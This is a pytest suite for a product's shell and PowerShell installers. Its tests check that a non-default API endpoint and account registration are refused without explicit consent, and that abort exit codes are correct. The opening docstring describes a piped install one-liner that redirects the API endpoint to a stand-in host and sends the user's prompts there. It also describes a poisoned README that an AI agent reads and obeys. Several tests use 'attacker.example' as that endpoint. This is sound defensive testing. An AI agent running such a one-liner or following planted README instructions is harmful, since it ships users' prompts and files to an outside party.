"""Consent, endpoint trust and abort-code behaviour of the two installers.

``tests/test_installer_validation.py`` covers what the installers will *accept*
as a value. This file covers something the value allow-list cannot reach: the
installers' published SHA256 pins the *script*, never the *command line*. A
genuine, byte-identical, hash-matching ``install.sh`` invoked as
``curl -fsSL https://yangble5.com/install.sh | sh -s -- --api https://not-us.example``
registers with that host, writes its key into ``~/.yangble5/credentials`` and
sets ``ANTHROPIC_BASE_URL`` to it -- after which every session started through
the launchers ships the user's prompts, file contents and diffs there. The
digest matches the whole time.

The landing page tells people to paste a one-liner into an AI agent, so the
attack needs no access to yangble5.com at all: it needs one poisoned README that
an agent reads and obeys. Hence the properties asserted here:

* a non-default endpoint is refused without explicit consent, and refused
  *before* anything is written;
* ``/auth/register`` -- which creates an account and consumes one of the
  endpoint's daily registration slots -- is refused without explicit consent;
* an abort reports an abort code, not the code that means "installed, add a key";
* both implementations agree on all of it.

Each test spells out the failure it is guarding, because a consent gate that
regresses fails open and silently.
"""

from __future__ import annotations

import json
import os
import platform
import re
import shutil
import stat
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
INSTALL_SH = ROOT / "site" / "install.sh"
INSTALL_PS1 = ROOT / "site" / "install.ps1"

SH = shutil.which("dash") or shutil.which("sh")
POWERSHELL = shutil.which("powershell.exe") or shutil.which("powershell")

needs_sh = pytest.mark.skipif(SH is None, reason="POSIX sh not available")
needs_powershell = pytest.mark.skipif(
    POWERSHELL is None, reason="Windows PowerShell not available"
)


# ── elevation ──────────────────────────────────────────────────────────────
#
# Both installers REFUSE to run elevated, on purpose: an install that writes
# root- or Administrator-owned files into a normal user's home breaks every
# later run, and an installer has no use for the privileges. GitHub's
# windows-latest runner executes as an Administrator, so on CI that guard fires
# first and every test below that expects a normal install gets exit 2 and an
# explanation instead of the behaviour it asserts.
#
# That is the installers being correct, not a bug to route around. There is
# deliberately no environment variable to bypass the guard for tests: a bypass
# that exists is a bypass that eventually runs in production, and the reason
# the guard exists does not stop applying because the caller is a test.
#
# So the predicate is the INSTALLER'S OWN, evaluated the same way each script
# evaluates it. Anything else would drift: a test that skips on a condition
# subtly different from the one the code checks is a test that skips when it
# should run, or runs when it cannot pass.
def _sh_thinks_it_is_root() -> bool:
    """Exactly what install.sh's refuse_root() decides: `id -u` == 0.

    On MSYS/Git-bash an Administrator account maps to uid 0, which is why this
    is not a POSIX-only concern.
    """
    if SH is None:
        return False
    if os.environ.get("SUDO_USER"):
        return True
    try:
        out = subprocess.run(  # noqa: S603 - fixed argv, interpreter from which()
            [SH, "-c", "id -u"], capture_output=True, text=True, timeout=30, check=False
        )
    except (OSError, subprocess.SubprocessError):  # pragma: no cover
        return False
    return out.stdout.strip() == "0"


def _windows_thinks_it_is_admin() -> bool:
    """Exactly what install.ps1 checks: WindowsPrincipal.IsInRole(Administrator)."""
    if platform.system() != "Windows":
        return False
    try:
        import ctypes

        return bool(ctypes.windll.shell32.IsUserAnAdmin())  # type: ignore[attr-defined]
    except Exception:  # pragma: no cover - non-Windows or restricted host
        return False


SH_ELEVATED = _sh_thinks_it_is_root()
PS_ELEVATED = _windows_thinks_it_is_admin()

# The reason string names what is NOT being covered, so a green run on an
# elevated machine cannot be mistaken for coverage of the install path. On a
# hosted Windows runner these skips are the honest report that only the
# refusal below was exercised.
_SH_SKIP = (
    "this shell reports uid 0, so install.sh refuses by design; the install "
    "path is NOT covered here (it is covered on Linux CI and on any "
    "unelevated developer machine)"
)
_PS_SKIP = (
    "this session is Administrator, so install.ps1 refuses by design; the "
    "install path is NOT covered here (it is covered on Linux CI and on any "
    "unelevated developer machine)"
)

needs_sh_unelevated = pytest.mark.skipif(SH is None or SH_ELEVATED, reason=_SH_SKIP)
needs_powershell_unelevated = pytest.mark.skipif(
    POWERSHELL is None or PS_ELEVATED, reason=_PS_SKIP
)

# Both installers document 2 as "refused: running as root / elevated".
EX_REFUSED_ELEVATED = 2


# Names the HOST SHELL creates inside a redirected home directory, before the
# script under test executes a single statement. Measured, not guessed: a
# PowerShell file whose entire contents are `exit 0`, launched with USERPROFILE
# pointed at an empty temporary directory, leaves `AppData` behind in it. It
# happens on an ordinary unelevated session too, so it is nothing to do with the
# elevation guard.
_HOST_SHELL_ARTEFACTS = frozenset({"AppData"})


def assert_the_run_wrote_nothing(home: Path, script: str) -> None:
    """Prove the INSTALLER left nothing, which is not the same as an empty dir.

    The assertion here used to be ``list(home.iterdir()) == []``, which is the
    property you actually want and is exactly right on Linux. On Windows it is
    not the installer's to keep: `AppData` above appears no matter what the
    script does, so on 2026-07-23 all five windows-latest cells went red over a
    directory `install.ps1` never touched. (It only ran there because the test
    is skipped unless the session is Administrator, and GitHub's runner is one
    while a developer's machine is not -- so it was green everywhere it was
    written and red everywhere it was reviewed.)

    Weakening it to "ignore AppData" would be the wrong repair: the allow-list
    then becomes the one place an installer could write undetected. So this
    checks three things instead of one, and the third is what keeps the other
    two honest:

      1. `.yangble5` does not exist. That is the ONLY thing either installer
         creates inside a home directory, so its absence is the direct claim.
      2. Nothing outside the allow-list is present at all -- an installer that
         starts writing somewhere new still fails, loudly, by name.
      3. Nothing anywhere beneath the allow-listed entries mentions yangble5.
         An installer that hid its output inside `AppData` -- which is where a
         Windows program would most plausibly put it -- is caught by this and
         by nothing else.
    """
    if not home.exists():
        return

    dot = home / ".yangble5"
    assert not dot.exists(), (
        f"{script} refused to run and then created {dot} anyway. Refusing is "
        "only half the promise."
    )

    unexpected = sorted(p.name for p in home.iterdir() if p.name not in _HOST_SHELL_ARTEFACTS)
    assert not unexpected, (
        f"{script} refused to run and left {unexpected} in the home directory. "
        f"Only {sorted(_HOST_SHELL_ARTEFACTS)} is expected there, and only "
        "because the host shell creates it before the script starts."
    )

    strays = [
        str(p.relative_to(home))
        for name in _HOST_SHELL_ARTEFACTS
        if (home / name).is_dir()
        for p in (home / name).rglob("*")
        if "yangble5" in p.name.lower()
    ]
    assert not strays, (
        f"{script} wrote {strays} inside {sorted(_HOST_SHELL_ARTEFACTS)}. That "
        "directory is allow-listed because the host shell creates it, not as a "
        "place the installer may write."
    )


def _skip_if_refused_for_elevation(
    proc: subprocess.CompletedProcess, elevated: bool, banner: str, reason: str
) -> None:
    """Skip the calling test when, and only when, BOTH conditions hold.

    Requiring both is the whole design. Skipping on the banner alone would hide
    a real defect -- an installer that refuses a perfectly normal session would
    silently stop being tested. Skipping on `elevated` alone would skip tests
    that never reach the guard at all, which is coverage thrown away for
    nothing. Together: on an elevated runner the refusal is recognised and
    reported honestly, and on any normal machine a refusal still fails the
    assertion that noticed it.

    This lives in the runners rather than in a list of test names because a
    hand-maintained list drifts the moment someone adds a test, and the drift
    shows up as a Windows-only red that takes a day to trace.
    """
    if not elevated:
        return
    out = (proc.stdout or "") + (proc.stderr or "")
    if proc.returncode == EX_REFUSED_ELEVATED and banner in out:
        pytest.skip(reason)

GOOD_KEY = "yb5_0123456789abcdef_AAAAAAAAAAAAAAAAAAAA"

# Every raw body POSTed to /auth/register, oldest first.
#
# Kept as the exact bytes-turned-text rather than a parsed dict: the property
# under test is what leaves the machine, and a field carrying part of a secret
# is invisible in every other observable the suite has. The installers print a
# TRUNCATED machine id by design, so no assertion over stdout can see the whole
# value, and nothing is written to disk that records the request. The wire is
# the only place to look.
REGISTER_BODIES: list[str] = []
_REGISTER_LOCK = threading.Lock()


def register_bodies() -> list[str]:
    with _REGISTER_LOCK:
        return list(REGISTER_BODIES)


def clear_register_bodies() -> None:
    with _REGISTER_LOCK:
        REGISTER_BODIES.clear()


# ==========================================================================
# a fake endpoint
#
# Routed by the FIRST path segment so one server can play every part: --api
# takes a path, so `--api http://127.0.0.1:PORT/ok` makes the installer call
# `/ok/auth/register`, `/ok/health` and so on.
# ==========================================================================
class _Handler(BaseHTTPRequestHandler):
    # HTTP/1.1, not the BaseHTTPRequestHandler default of 1.0. Every reply here
    # carries an accurate Content-Length, so keep-alive is honest -- and under
    # 1.0 the server closes the socket after each reply, which Windows
    # PowerShell's Invoke-WebRequest intermittently reported as "could not
    # reach the endpoint at all" against this loopback fixture.
    protocol_version = "HTTP/1.1"

    def _reply(self, code: int, obj: dict) -> None:
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _drain(self) -> bytes:
        """Consume the request body before replying, and hand it back.

        Not optional on a keep-alive connection: answering a POST without
        reading its body leaves those bytes in the socket, and the next request
        on the same connection starts parsing mid-JSON -- which surfaces as a
        501 on an unrelated later call, or as a reset the installer reports as
        "could not reach the endpoint at all".
        """
        try:
            length = int(self.headers.get("content-length") or 0)
        except ValueError:
            length = 0
        if length > 0:
            return self.rfile.read(length)
        return b""

    def _route(self) -> None:
        raw = self._drain()
        parts = self.path.split("?")[0].strip("/").split("/")
        mode = parts[0] if parts else ""
        tail = "/" + "/".join(parts[1:])
        if tail == "/health":
            self._reply(200, {"status": "ok", "accepting_requests": True})
            return
        if tail == "/v1/models":
            self._reply(200, {"data": [{"id": "yangble5"}]})
            return
        if tail == "/v1/messages":
            self._reply(200, {"content": [{"type": "text", "text": "pong"}]})
            return
        if tail == "/auth/register":
            with _REGISTER_LOCK:
                REGISTER_BODIES.append(raw.decode("utf-8", "replace"))
            if mode == "ok":
                self._reply(201, {"api_key": GOOD_KEY, "key_id": "0123456789abcdef"})
            elif mode == "reused":
                self._reply(
                    200,
                    {
                        "api_key": GOOD_KEY,
                        "key_id": "0123456789abcdef",
                        "reused": True,
                        "warning": "This machine already had a key, so no new one was created.",
                    },
                )
            elif mode == "dry":
                # A perfectly valid key issued into an empty pool. This is the
                # shape gateway/app.py::_issuance_status produces, and the only
                # signal the user gets when --no-live-test / -NoLiveTest means
                # no completion is ever attempted.
                self._reply(
                    201,
                    {
                        "api_key": GOOD_KEY,
                        "key_id": "0123456789abcdef",
                        "usable_now": False,
                        "pool_remaining_pct": 0.0,
                        "not_usable_reason": "pool_exhausted",
                        "not_usable_detail": (
                            "The shared pool is spent for today and will reset at "
                            "00:00 UTC."
                        ),
                        "retry_after_seconds": 3600,
                    },
                )
            elif mode == "junk":
                self._reply(200, {"message": "here you go, friend"})
            elif mode == "busy":
                self._reply(429, {"type": "pool_full", "message": "the pool is full, sorry"})
            else:
                self._reply(500, {"message": "unknown mode"})
            return
        self._reply(404, {"message": "no such path"})

    do_GET = _route
    do_POST = _route

    def log_message(self, *_args) -> None:
        return  # keep the suite's output free of one access-log line per call


@pytest.fixture(scope="module")
def fake_api():
    """Base URL of a loopback endpoint. Append /ok, /reused, /dry, /junk or /busy."""
    # Threading, not the single-threaded HTTPServer: a run makes several
    # sequential calls and each installer opens a fresh connection, so a
    # serialised server turns an ordinary backlog into an intermittent
    # "could not reach the endpoint at all".
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


# ==========================================================================
# harnesses
# ==========================================================================
IS_WINDOWS = platform.system() == "Windows"


def _write_shim(path: Path, body: str) -> None:
    path.write_text(body, newline="\n")
    path.chmod(path.stat().st_mode | stat.S_IEXEC)


_UNAME_SHIM = """\
#!/bin/sh
case "${1:-}" in
  -s) echo Linux ;;
  -m) echo x86_64 ;;
  -n) echo testhost ;;
  *)  echo Linux ;;
esac
"""

# Test harness only. Nothing here is part of install.sh, and it must never
# change the REQUEST -- only the two directives that name a file on this disk.
#
# `cygpath -m` rather than a text substitution: see the sh_shim docstring. A
# pattern that assumes a path SHAPE is a pattern that silently matches nothing
# on a machine whose mount table differs, and a curlrc that reaches curl.exe
# unconverted fails as "could not reach the endpoint" -- which reads as a
# network fault and is nothing of the kind.
#
# @REAL_CURL@ is substituted by str.replace and not by %-formatting or
# str.format: this script is dense with `%` (printf conversions, `${p%...}`)
# and `{}`, and escaping all of it for the sake of one placeholder is how a
# shell script acquires a bug that only shows up at runtime.
_CURL_SHIM = """\
#!/bin/sh
REAL="@REAL_CURL@"
if [ "${1:-}" = "--config" ] && [ -f "${2:-}" ]; then
    cfg="$2"
    shift 2
    if ! command -v cygpath >/dev/null 2>&1; then
        printf '%s\\n' "test shim: cygpath is not on PATH, so the local paths in" \\
            "${cfg} cannot be converted into a form native curl.exe can open." >&2
        exit 127
    fi
    win="${cfg}.win"
    : > "$win"
    chmod 600 "$win"
    while IFS= read -r line || [ -n "$line" ]; do
        case "$line" in
            'output = "'*'"')
                p=${line#'output = "'}
                p=${p%'"'}
                printf 'output = "%s"\\n' "$(cygpath -m "$p")"
                ;;
            'data-binary = "@'*'"')
                p=${line#'data-binary = "@'}
                p=${p%'"'}
                printf 'data-binary = "@%s"\\n' "$(cygpath -m "$p")"
                ;;
            *)
                printf '%s\\n' "$line"
                ;;
        esac
    done < "$cfg" >> "$win"
    exec "$REAL" --config "$(cygpath -m "$win")" "$@"
fi
exec "$REAL" "$@"
"""


@pytest.fixture(scope="session")
def sh_shim(tmp_path_factory) -> str:
    """A PATH prefix that makes install.sh runnable on Windows.

    install.sh is a macOS/Linux artefact and refuses outright under Git Bash --
    `uname -s` there says MINGW64_NT and the Windows binaries need install.ps1.
    That refusal is a feature and has its own test below. This fixture exists so
    that the REST of the POSIX behaviour can still be exercised on a Windows
    developer box AND on GitHub's windows-latest runner, and it is a no-op on
    Linux CI, where the real uname and the real curl are used.

    Two shims, both Windows-only:

    * `uname`, which reports Linux;

    * `curl`, which converts the LOCAL FILE PATHS inside the generated curlrc
      into Windows form before delegating to the real curl.exe.

    WHY THE CURL SHIM EXISTS, AND WHY IT MUST NOT ASSUME A PATH SHAPE

    MSYS rewrites path-shaped environment variables when a NATIVE process
    (pytest) launches an MSYS one (dash), so whatever `sh_run` puts in TMPDIR
    arrives inside install.sh in POSIX form. `mktemp -d` inherits that form, and
    so does every `output = "..."` and `data-binary = "@..."` line that
    http_call writes into its curlrc. curl.exe is a native Windows binary and
    cannot open a POSIX path.

    WHICH POSIX form depends on the MSYS mount table, and that differs between
    machines. Git Bash binds /tmp to the Windows temp directory
    (`... on /tmp type ntfs (binary,noacl,posix=0,usertemp)`), so on a developer
    box -- where pytest's basetemp sits under %TEMP% -- the path comes back as
    `/tmp/...`, the shortest mount that covers it. On GitHub's windows-latest it
    does not: CI reported the installed-to path as
    `/c/Users/runneradmin/AppData/Local/Temp/...`, i.e. the same directory
    reached through the plain drive mount because it did NOT match /tmp. (The
    likeliest reason, not something this file can verify from here: %TEMP% on
    that image is the 8.3 short form `C:\\Users\\RUNNER~1\\...` while pytest
    resolves its basetemp to the long `runneradmin` form, so the two spellings
    no longer share a prefix. The fix below does not depend on the reason.)

    An earlier version of this shim rewrote the literal substring `/tmp/`. On
    the runner nothing matched, the curlrc reached curl.exe unconverted, curl
    answered `Failed to open .../register.json`, and install.sh -- correctly --
    reported "Could not reach <endpoint> at all" and exited 5. Every sh test
    that needs a completed request went red with a message that pointed at the
    network. Hence: ask cygpath, never pattern-match the path. Reproduce it with
    `pytest --basetemp=<a directory outside %TEMP%>`, which puts a developer box
    into exactly the runner's shape.

    Only the two directives that name a file on this disk are touched. The URL,
    the headers, the body and every code path in install.sh are the real ones.
    """
    if not IS_WINDOWS:
        return ""
    d = tmp_path_factory.mktemp("shim")
    _write_shim(d / "uname", _UNAME_SHIM)
    real_curl = shutil.which("curl")
    if real_curl:
        # Forward slashes: the shim runs under MSYS sh, where a backslash in an
        # `exec` argument is an escape rather than a separator.
        _write_shim(
            d / "curl", _CURL_SHIM.replace("@REAL_CURL@", real_curl.replace("\\", "/"))
        )
    return str(d)


def sh_run(
    home: Path,
    args: list[str],
    shim: str = "",
    extra_env: dict | None = None,
    expect_refusal: bool = False,
) -> subprocess.CompletedProcess:
    """Run the real install.sh with stdin closed -- the `curl | sh` shape.

    stdin is DEVNULL on purpose: that is what makes `[ -t 0 ]` false, which is
    the exact condition under which the advertised one-liner runs and under
    which no prompt can reach a human.
    """
    assert SH is not None
    env = dict(os.environ)
    # Forward slashes: MSYS sh and Windows curl.exe both understand C:/a/b,
    # while a backslash is an escape to the former and mktemp would embed it.
    home_arg = str(home).replace("\\", "/")
    env.update({"HOME": home_arg, "NO_COLOR": "1"})
    # install.sh's scratch directory comes from `mktemp -d`, so this keeps it
    # inside the per-test home and out of the machine's real temp directory.
    #
    # It does NOT decide the SHAPE of that path: MSYS converts TMPDIR to POSIX
    # form on the way into dash whatever is written here, and which POSIX form
    # depends on the mount table. Making those paths openable by the native
    # curl.exe is the curl shim's job -- see sh_shim.
    env["TMPDIR"] = home_arg
    env.pop("YB5_SOURCE_ONLY", None)
    for name in ("YANGBLE5_API", "YANGBLE5_API_KEY", "YANGBLE5_EMAIL", "YANGBLE5_INVITE"):
        env.pop(name, None)
    if shim:
        env["PATH"] = shim + os.pathsep + env["PATH"]
    if extra_env:
        env.update(extra_env)
    proc = subprocess.run(  # noqa: S603 - fixed argv, interpreter from shutil.which
        [SH, str(INSTALL_SH), *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=env,
        stdin=subprocess.DEVNULL,
        timeout=180,
    )
    if not expect_refusal:
        _skip_if_refused_for_elevation(proc, SH_ELEVATED, "REFUSING TO RUN AS ROOT", _SH_SKIP)
    return proc


def ps_run(
    profile: Path, args: list[str], expect_refusal: bool = False
) -> subprocess.CompletedProcess:
    assert POWERSHELL is not None
    env = dict(os.environ)
    env["USERPROFILE"] = str(profile)
    # PowerShell writes its module-analysis cache under LOCALAPPDATA and its
    # profile under APPDATA. Redirecting only USERPROFILE left both pointing at
    # the real ones -- or, when unset, at a path relative to the working
    # directory, which is how `Microsoft/Windows/PowerShell/ModuleAnalysisCache`
    # appeared inside the repository and was one `git add -A` away from being
    # committed. A test that isolates a home directory has to isolate all of it.
    #
    # Sibling of the profile, not inside it: several tests assert the profile
    # is untouched (`list(profile.iterdir()) == []` after a refused run), and
    # PowerShell's own cache landing there would make those assertions fail for
    # a reason that has nothing to do with the installer.
    appdata = profile.parent / "_winappdata"
    (appdata / "Local").mkdir(parents=True, exist_ok=True)
    (appdata / "Roaming").mkdir(parents=True, exist_ok=True)
    env["LOCALAPPDATA"] = str(appdata / "Local")
    env["APPDATA"] = str(appdata / "Roaming")
    for name in ("YANGBLE5_API", "YANGBLE5_API_KEY", "YANGBLE5_EMAIL", "YANGBLE5_INVITE"):
        env.pop(name, None)
    proc = subprocess.run(  # noqa: S603 - fixed argv, interpreter from shutil.which
        [
            POWERSHELL,
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            str(INSTALL_PS1),
            *args,
        ],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=env,
        stdin=subprocess.DEVNULL,
        timeout=300,
    )
    if not expect_refusal:
        _skip_if_refused_for_elevation(proc, PS_ELEVATED, "REFUSING TO RUN ELEVATED", _PS_SKIP)
    return proc


def installed_paths(home: Path) -> list[str]:
    """Everything the installer created, minus the local salt.

    machine-id is excluded because it is written before the registration call
    and is not part of "an install exists": it is a random number in a file.
    """
    root = home / ".yangble5"
    if not root.exists():
        return []
    return sorted(
        str(p.relative_to(root)) for p in root.rglob("*") if p.name != "machine-id"
    )


# ==========================================================================
# 0. the harness's own guard
#
# Everything below this point runs install.sh through the curl shim on Windows.
# When that shim stops converting a path it says nothing: curl fails to open a
# file, install.sh reports "could not reach the endpoint at all", and every
# consent test that needs a completed request goes red pointing at the network.
# (CI named eight of them; the workflow's annotation step caps that list at
# eight, so the count in a red matrix cell is a floor, not a total.) That is how
# a mount-table difference between a developer box and windows-latest cost a
# day. So the shim gets a test of its own, and it fails for the real reason.
# ==========================================================================
def _msys_c_form(path: Path) -> str:
    """``C:\\a\\b`` -> ``/c/a/b`` -- the one mount every MSYS install has.

    Written by hand rather than asked of cygpath on purpose: cygpath returns the
    SHORTEST form the mount table allows, which on a machine where /tmp covers
    the Windows temp directory is ``/tmp/...``. That is the shape this harness
    used to assume, so deriving the test input from it would test only the case
    that already worked.
    """
    drive, rest = os.path.splitdrive(str(path))
    if not re.fullmatch(r"[A-Za-z]:", drive):
        pytest.skip(f"{path} is not on a lettered drive, so it has no /<letter>/ form")
    return "/" + drive[0].lower() + rest.replace("\\", "/")


@pytest.mark.skipif(
    SH is None or not IS_WINDOWS,
    reason="the curl shim is Windows-only; Linux CI runs install.sh against the real curl",
)
def test_the_curl_shim_converts_every_path_shape_a_runner_can_produce(
    tmp_path, sh_shim, fake_api
):
    """A curlrc whose file paths are POSIX must still be usable by curl.exe.

    install.sh writes `output = "..."` and `data-binary = "@..."` with whatever
    shape `mktemp -d` produced, and that shape is decided by the MSYS mount
    table: `/tmp/...` on a developer box, `/c/Users/...` on windows-latest. Both
    are POSIX and neither can be opened by a native curl.exe, so every shape is
    tried here -- including the one this machine does NOT generate, which is the
    whole point: the old shim was green on a developer box while converting
    nothing at all on the runner.

    The URL is checked byte-for-byte as well: a shim that edits the request
    rather than the filenames would make every other sh test in this file assert
    something about a request the installer did not make.
    """
    shim_curl = Path(sh_shim) / "curl"
    assert shim_curl.is_file(), (
        "no curl shim was written (shutil.which('curl') found nothing), so the "
        "sh tests below are not running against what they think they are"
    )

    url = f"{fake_api}/ok/health"
    shapes = {
        "windows": str(tmp_path).replace("\\", "/"),
        "msys-drive": _msys_c_form(tmp_path),
        # Whatever THIS machine's mount table calls the same directory, which on
        # a box where /tmp covers %TEMP% is the `/tmp/...` form. Usually equal to
        # one of the two above; kept separate so a third shape cannot appear
        # without this test seeing it.
        "msys-shortest": subprocess.run(  # noqa: S603 - fixed argv, interpreter from which()
            [SH, "-c", 'cygpath -u "$1"', "sh", str(tmp_path)],
            capture_output=True,
            text=True,
            timeout=60,
            check=True,
        ).stdout.strip(),
    }
    for name, base in shapes.items():
        cfg = tmp_path / f"curlrc.{name}"
        out_name = f"resp.{name}"
        cfg.write_text(
            "silent\n"
            "show-error\n"
            'request = "GET"\n'
            'header = "accept: application/json"\n'
            f'output = "{base}/{out_name}"\n'
            'write-out = "%{http_code}"\n'
            f'url = "{url}"\n',
            newline="\n",
        )
        proc = subprocess.run(  # noqa: S603 - fixed argv, interpreter from which()
            [SH, str(shim_curl), "--config", str(cfg).replace("\\", "/")],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=120,
        )
        detail = f"[{name}] rc={proc.returncode} out={proc.stdout!r} err={proc.stderr!r}"
        assert proc.returncode == 0, detail
        assert proc.stdout.strip() == "200", detail
        body = (tmp_path / out_name).read_text(encoding="utf-8")
        assert '"status": "ok"' in body, detail

        rewritten = (tmp_path / f"{cfg.name}.win").read_text(encoding="utf-8")
        assert f'url = "{url}"\n' in rewritten, (
            f"[{name}] the shim edited the request, not just the filenames:\n{rewritten}"
        )


# ==========================================================================
# 1. a non-default endpoint is a privileged choice
# ==========================================================================
@needs_sh
def test_sh_refuses_a_nondefault_endpoint_with_no_terminal(tmp_path, sh_shim):
    """`... | sh -s -- --api https://attacker.tld` used to be accepted silently.

    The URL passed the shape check at input time and the https:// check in
    preflight, and nothing anywhere distinguished it from the default. Regressing
    this test means a poisoned one-liner installs a working exfiltration path.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--api", "https://attacker.example", "--dry-run"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "attacker.example" in out
    assert "--allow-nondefault-endpoint" in out
    # It must name what the host receives, not just that it is unusual.
    assert "ANTHROPIC_BASE_URL" in out
    # Refused before the filesystem was touched at all.
    assert installed_paths(home) == []
    assert not (home / ".yangble5").exists()


@needs_sh
def test_sh_nondefault_endpoint_banner_precedes_any_promise(tmp_path, sh_shim):
    """The refusal must not come after a banner that already said what it would do."""
    home = tmp_path / "home"
    home.mkdir()
    out = sh_run(home, ["--api", "https://attacker.example", "--dry-run"], sh_shim).stdout
    assert "Installs to" not in out, "the banner ran before the endpoint was agreed"


@needs_sh
def test_sh_accepts_a_nondefault_endpoint_when_consent_is_explicit(tmp_path, sh_shim):
    """The gate has to be passable, or the documented local BYOK path is dead."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        ["--api", "http://127.0.0.1:8320", "--allow-nondefault-endpoint", "--dry-run"],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "--allow-nondefault-endpoint was passed" in out


@needs_sh
def test_sh_default_endpoint_needs_no_endpoint_consent(tmp_path, sh_shim):
    """The canonical command must stay one flag long, not two."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--yes-register", "--dry-run"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "NOT yangble5.com" not in out


@needs_powershell
def test_ps_refuses_a_nondefault_endpoint_with_no_console(tmp_path):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(profile, ["-Api", "https://attacker.example", "-DryRun"])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "attacker.example" in out
    assert "-AllowNonDefaultEndpoint" in out
    assert "ANTHROPIC_BASE_URL" in out
    assert not (profile / ".yangble5").exists()


@needs_powershell
def test_ps_accepts_a_nondefault_endpoint_when_consent_is_explicit(tmp_path):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile, ["-Api", "http://127.0.0.1:8320", "-AllowNonDefaultEndpoint", "-DryRun"]
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "-AllowNonDefaultEndpoint was passed" in out


# ==========================================================================
# 2. registration is account creation, so it asks first
# ==========================================================================
@needs_sh
def test_sh_refuses_to_register_with_no_terminal_and_no_flag(tmp_path, sh_shim):
    """There used to be no consent step anywhere in the install path.

    The only `read` in install.sh was inside the here-doc that writes the
    *uninstaller*. So an agent handed "set up yangble5" created an account,
    minted a credential and wrote it to disk with nobody having said yes.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--no-bin-link"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "--yes-register" in out
    # It must say what would be created, not merely that it refused.
    assert "/auth/register" in out
    assert "registrations-per-day" in out
    assert installed_paths(home) == []


@needs_sh
def test_sh_registers_when_the_flag_is_present(tmp_path, sh_shim, fake_api):
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/ok",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "registered" in out
    assert "credentials" in installed_paths(home)
    assert GOOD_KEY.encode() in (home / ".yangble5" / "credentials").read_bytes()


@needs_sh
def test_sh_byok_key_needs_no_registration_consent(tmp_path, sh_shim, fake_api):
    """Supplying a key registers nothing, so it must not be gated."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/junk",
            "--allow-nondefault-endpoint",
            "--no-bin-link",
        ],
        sh_shim,
        extra_env={"YANGBLE5_API_KEY": GOOD_KEY},
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "no registration needed" in out
    # The banner still explains the flag; what must not appear is the refusal.
    assert "REFUSED" not in out
    assert "This next step creates an account" not in out


@needs_powershell
def test_ps_refuses_to_register_with_no_console_and_no_switch(tmp_path):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(profile, [])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "-YesRegister" in out
    assert "/auth/register" in out
    assert not (profile / ".yangble5").exists()


@needs_powershell
def test_ps_registers_when_the_switch_is_present(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        ["-Api", fake_api + "/ok", "-AllowNonDefaultEndpoint", "-YesRegister", "-NoLiveTest"],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "registered" in out
    assert GOOD_KEY.encode() in (profile / ".yangble5" / "credentials").read_bytes()


# ==========================================================================
# 3. an abort must not report the code that means "installed"
# ==========================================================================
@needs_sh
def test_sh_unusable_register_reply_exits_9_not_6(tmp_path, sh_shim, fake_api):
    """6 used to be emitted for two disjoint outcomes.

    The documented one is the BYOK fall-through, which happens after
    write_config and leaves a complete install on disk. The other was this
    abort, which happens before write_config and leaves nothing -- reported
    with the code that tells the reader "installed, just add a key".
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/junk",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 9, out
    # And the claim the code makes has to be true.
    assert installed_paths(home) == [], "exit 9 promised nothing was installed"


@needs_sh
def test_sh_byok_fallthrough_still_exits_6_with_a_real_install(tmp_path, sh_shim, fake_api):
    """The mirror: 6 must keep meaning "a complete install, only the key is missing"."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/busy",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 6, out
    present = installed_paths(home)
    for expected in ("credentials", "env.sh", "uninstall.sh"):
        assert expected in present, f"exit 6 promised an install; {expected} is missing"


@needs_powershell
def test_ps_unusable_register_reply_exits_9_not_6(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        [
            "-Api",
